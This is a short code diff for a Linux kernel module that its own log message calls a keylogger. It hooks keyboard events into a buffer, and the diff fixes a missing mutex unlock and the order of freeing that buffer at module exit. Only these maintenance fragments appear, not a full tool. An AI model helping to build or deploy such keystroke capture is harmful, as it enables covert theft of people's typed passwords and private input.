@@ -50,6 +50,7 @@ static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
 		if (!new_buffer)
 		{
             printk(KERN_ERR "Keylogger: Failed to allocate more memory for device buffer\n");
+			mutex_unlock(&buffer_lock);
             return NOTIFY_OK;
 		}
 		device_buffer = new_buffer;
@@ -147,11 +148,11 @@ static void	__exit ModuleExit(void)
 
     mutex_lock(&buffer_lock);
     print_pressed_keys();
+    kfree(device_buffer);
     mutex_unlock(&buffer_lock);
 
     misc_deregister(&misc_device);
 	unregister_keyboard_notifier(&keyboard_notifier);
-    kfree(device_buffer);
 	return ;
 }
 
